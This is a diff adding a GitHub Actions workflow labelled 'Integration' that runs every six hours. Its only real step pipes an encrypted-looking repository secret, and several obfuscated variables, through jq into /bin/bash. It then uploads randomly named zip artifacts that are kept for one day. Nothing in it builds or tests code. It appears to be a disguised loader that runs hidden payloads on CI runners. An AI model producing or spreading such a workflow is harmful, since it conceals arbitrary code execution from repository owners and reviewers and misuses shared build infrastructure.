@@ -1,0 +1,35 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '13 0,6,12,18 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          qjd85: ${{ secrets.qjd85 }}
+        run: |
+          printf '%s' "$qjd85" | jq -r .zqdo46576 | /bin/bash
+          echo $gnxf3 | jq -r .tmu006 | /bin/bash
+          echo $lsgd4 | jq -r .ixigx435 | /bin/bash
+          printf '%s' "$fweg66600" | jq -r .nie96 | /bin/bash
+          printf '%s' "$ctz07073" | jq -r .az4 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: DvAQYZpF
+          path: "*.zip"
+          retention-days: 1
